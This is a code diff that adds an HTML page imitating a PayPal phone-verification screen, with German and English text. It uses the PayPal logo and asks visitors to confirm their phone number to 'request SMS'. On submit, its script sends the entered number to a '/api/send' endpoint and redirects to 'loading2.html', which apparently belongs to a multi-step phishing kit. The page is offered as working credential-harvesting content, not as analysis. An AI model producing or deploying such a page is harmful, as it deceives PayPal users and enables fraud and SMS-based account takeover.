@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      min-height: 100vh;
+      margin: 0;
+      background: #fff;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 360px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      height: 40px;
+    }
+
+    .info-text {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+
+    .button-primary {
+      display: block;
+      width: 100%;
+      background-color: #0070ba;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 14px 0;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background-color 0.3s ease;
+    }
+
+    .button-primary:hover {
+      background-color: #005ea6;
+    }
+    /* Mobile Optimierung */
+@media (max-width: 420px) {
+  .container { width: 92%; max-width: 360px; }
+
+  .logo { margin-bottom: 14px; }
+  .logo img { height: 34px; }
+
+  .info-text { font-size: 13px; margin-bottom: 12px; padding: 0 6px; }
+
+  .input-field {
+    padding: 13px;
+    font-size: 16px; /* wichtig gegen iOS-Zoom */
+    border-radius: 8px;
+  }
+
+  .button-primary {
+    font-size: 16px;
+    padding: 13px 0;
+    border-radius: 28px;
+  }
+}
+
+@media (max-width: 320px) {
+  .logo img { height: 30px; }
+  .info-text { font-size: 12px; }
+  .input-field { padding: 12px; }
+}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
+    </div>
+
+    <form id="verifyForm">
+      <div class="info-text" id="infoText"></div>
+
+      <!-- Telefonnummer -->
+      <input 
+        type="tel" 
+        id="phone" 
+        class="input-field" 
+        placeholder="" 
+        required
+        title="Bitte geben Sie eine gültige Telefonnummer ein.">
+
+      <button type="submit" id="smsBtn" class="button-primary"></button>
+    </form>
+  </div>
+
+  <script>
+    
+    // Übersetzungen
+    const translations = {
+      de: {
+        infoText: "Bestätigen Sie Ihre Telefonnummer, um fortzufahren:",
+        phonePlaceholder: "Telefonnummer",
+        smsBtn: "SMS anfordern",
+        invalid: "Bitte geben Sie eine gültige Telefonnummer ein."
+      },
+      en: {
+        infoText: "Confirm your phone number to continue:",
+        phonePlaceholder: "Phone number",
+        smsBtn: "Request SMS",
+        invalid: "Please enter a valid phone number."
+      }
+    };
+
+    const lang = localStorage.getItem("lang") || "de";
+    const t = translations[lang];
+
+    document.getElementById("infoText").textContent = t.infoText;
+    document.getElementById("phone").placeholder = t.phonePlaceholder;
+    document.getElementById("smsBtn").textContent = t.smsBtn;
+
+    // Eingabe filtern (nur Zahlen, +, Leerzeichen, - und Klammern)
+document.getElementById("phone").addEventListener("input", function () {
+  this.value = this.value.replace(/[^0-9+\s()-]/g, "");
+});
+document.getElementById("verifyForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const phone = document.getElementById("phone").value.trim();
+
+  const text = `Telefonnummer: ${phone}`;
+
+  await fetch("/api/send", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ phone, message: text })
+  });
+  window.location.href = "loading2.html";
+});
+  </script>
+</body>
+</html>
